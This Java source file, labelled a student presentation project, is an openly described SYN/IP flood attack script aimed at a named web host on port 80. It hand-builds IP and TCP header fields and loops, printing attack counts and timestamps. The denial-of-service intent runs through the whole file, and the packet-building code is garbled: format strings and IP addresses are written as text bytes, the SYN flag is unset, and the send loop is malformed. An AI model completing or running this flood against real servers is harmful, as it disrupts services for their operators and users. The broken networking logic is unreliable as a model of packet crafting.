/*

David Jensen, Presentation project. This program is designed to use both TCP and IP vulnerabilities 


*/







import java.io.BufferedReader;
import java.io.DataOutputStream;
import java.io.IOException;
import java.io.InputStreamReader;
import java.net.Socket;
import java.lang.Exception;
import java.net.SocketException;
import java.nio.ByteBuffer;
import java.util.Date;
import java.util.Scanner;
import java.time.LocalDateTime;
import java.time.format.DateTimeFormatter;



class TCPSynIPAttack {

  public static void main(String[] args) {

  	//declairing both the TCP, IP and special character variables

    boolean et = true;
    int count = 0;
    String characters = "!BBHHHBBH4s4s";
    String newCharacters = "HHLLBBHHH";
    String source_ip = "10.1.10.1";
    String dest_ip = "10.1.12.173";
    byte[] charactersBytes = characters.getBytes();
    int ip_ihl = 5;
    int ip_tos = 0;
    int ip_tot_len = 0; //kernel will fill the correct total lenght
    int ip_id = 54321;  //ID of this packet
    int ip_frag_off = 0;
    int	ip_ttl = 255;
    int ip_proto = 6;
    int	ip_check = 0;    //kernel will fill the correct checksum
    int tcp_source = 1234;
    int tcp_doff = 5;
    int tcp_urg = 0;
	int tcp_dest = 80;
	int tcp_rst = 0;
	int tcp_psh = 0;
	int tcp_ack = 0;
	int tcp_seq = 454;
	int tcp_ack_seq = 0;
	int tcp_window = 5840;
	int tcp_check = 0;
	int tcp_urg_ptr = 0; 
    int ip_ver = 4;
    int tcp_syn =0;
    int tcp_fin = 0;
    int placeholder = 0;
    Socket socket = null;
    DateTimeFormatter dtf = DateTimeFormatter.ofPattern("MM/dd/yyy");
    LocalDateTime now = LocalDateTime.now();
    //long currentTime = System.currentTimeSec();
    
    

    byte[] source_ipBytes = source_ip.getBytes();
    byte[] destination_ipBytes = dest_ip.getBytes();

    int ip_ihl_ver = (ip_ver << 4) + ip_ihl;


    //connect to the socket and port of the desired website

	try {
	 socket = new Socket("frechetta.me", 80); 
	} catch (Exception e) { 
		System.out.println("Error, connection failed. please try again:"); 
		System.exit(0); 
	} 
	System.out.println("Success"); 
	ByteBuffer buf = ByteBuffer.allocate(1024);

	//


	buf.put(charactersBytes);
	buf.putInt(ip_ihl_ver);
	buf.putInt(ip_tos);
	buf.putInt(ip_tot_len);
	buf.putInt(ip_id);
	buf.putInt(ip_frag_off);
	buf.putInt(ip_ttl);
	buf.putInt(ip_proto);
	buf.putInt(ip_check);
	buf.put(source_ipBytes);
	buf.put(destination_ipBytes);

	int size = buf.remaining();
	byte[] arr = new byte[buf.remaining()];
	buf.get(arr);
		

		// this is going to now push TCP
	System.out.println("IP Size is: " + size); 

	try {
		socket = new Socket("frechetta.me", 80); 
	} catch (Exception e) { 
		System.out.println("Error, connection failed. please try again:"); 
		System.exit(0); 
	} 
	System.out.println("Success"); 
	ByteBuffer newbuf = ByteBuffer.allocate(1024);

	byte[] charBytes = newCharacters.getBytes();


	int tcp_offset_res = (tcp_doff << 4);
	int tcp_flags = (tcp_syn << 1) + (tcp_rst << 2) + (tcp_psh <<3) + (tcp_ack << 4) + (tcp_urg << 5) + tcp_fin;


	newbuf.put(charBytes);
	newbuf.putInt(tcp_source);
	newbuf.putInt(tcp_dest);
	newbuf.putInt(tcp_seq);
	newbuf.putInt(tcp_ack_seq);
	newbuf.putInt(tcp_offset_res);
	newbuf.putInt(tcp_flags);
	newbuf.putInt(tcp_window);
	newbuf.putInt(tcp_check);
	newbuf.putInt(tcp_urg_ptr);
	newbuf.put(source_ipBytes);
	newbuf.put(destination_ipBytes);

	int thisSize = newbuf.remaining();
	byte[] newArr = new byte[newbuf.remaining()];
	newbuf.get(newArr);
		
	System.out.println("TCP Size is: " + thisSize); 


	//after completeing the IP flood, now this is going to complete the TCP flood

	while (true) { 

		
		try (DataOutputStream outToServer = new DataOutputStream(socket.getOutputStream()))
		{ 
			while (et != false) {
			outToServer.write(arr, 0, size);
			outToServer.write(newArr, 0, thisSize);
			while (count != 100000) {
			System.out.println( "\nTime of Attack: " + dtf.format(now) + " "+ java.time.LocalTime.now() + "\nAttack number:" + count + "\nIP:" + count + " \nTCP:" + count);
			//System.out.println("TCP sent attack number: " + newArr);

			++ count;
		}
		
		}
			
			} catch (IOException ee) { 
				System.out.println("Attack complete: " + dtf.format(now) + " "+ java.time.LocalTime.now());
			} 
			et = false;
			break;
			} try { 
				socket.close(); 
			} catch (IOException ee) { 
				
				System.out.println("socket closed");
				System.exit(0);
			}
		}
	}
	




